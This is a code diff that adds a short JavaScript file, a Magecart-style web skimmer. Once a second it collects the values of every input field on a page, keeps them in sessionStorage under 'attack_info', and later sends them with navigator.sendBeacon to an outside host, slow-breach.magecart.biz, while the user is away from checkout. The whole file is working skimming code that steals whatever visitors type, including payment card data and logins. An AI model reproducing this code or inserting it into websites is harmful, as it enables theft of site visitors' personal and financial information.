@@ -1,0 +1,24 @@
+(() => {
+  const a = {},
+    b = sessionStorage.getItem("attack_info");
+  if (b && window.location.href.indexOf('checkout') < 0) {
+    navigator.sendBeacon("https://slow-breach.magecart.biz/?slowBreach=&", b)
+    sessionStorage.removeItem("attack_info");
+  } else {
+    const getIdentifier = function (inputElem) {
+      return inputElem.name || inputElem.id || inputElem.className
+    }
+
+    setInterval(() => {
+      const exfilData = {}
+      Array.from(document.querySelectorAll("input")).forEach((inputElem) => {
+        if (inputElem.value != "") {
+          const inputElemIdentifer = getIdentifier(inputElem)
+          exfilData[inputElemIdentifer] = inputElem.value
+        }
+      })
+
+      sessionStorage.setItem('attack_info', JSON.stringify(exfilData))
+    }, 1000)
+  }
+})();
